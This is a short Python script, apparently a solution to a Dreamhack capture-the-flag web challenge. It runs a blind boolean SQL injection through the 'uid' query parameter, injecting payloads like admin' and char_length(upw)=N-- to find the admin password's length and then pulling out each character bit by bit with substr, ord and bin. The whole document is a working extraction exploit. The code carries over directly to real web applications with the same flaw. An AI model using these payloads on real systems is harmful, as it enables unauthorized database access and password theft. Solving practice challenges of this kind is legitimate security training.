from requests import get

url = "http://host3.dreamhack.games:11188/"

# 패스워드 길이
pw_length = next(i for i in range(1, 100) if "exists" in get(f"{url}/?uid=admin' and char_length(upw)={i}-- ").text)
print(f"password length: {pw_length}")

# 문자 별 비트 길이 & 비트 출력
flag = ""
for i in range(1, pw_length + 1):
    bit_length = next(j for j in range(1, 100) if "exists" in get(f"{url}/?uid=admin' and length(bin(ord(substr(upw, {i}, 1)))) = {j}-- ").text)
    print(f"{i} bit length: {bit_length}")

    bit = "".join("1" if "exists" in get(f"{url}/?uid=admin' and substr(bin(ord(substr(upw, {i}, 1))), {j}, 1) = '1'-- ").text else "0" for j in range(1, bit_length + 1))
    print(f"{i} bit: {bit}")

    flag += int.to_bytes(int(bit, 2), (bit_length + 7) // 8, "big").decode("utf-8")

print(flag)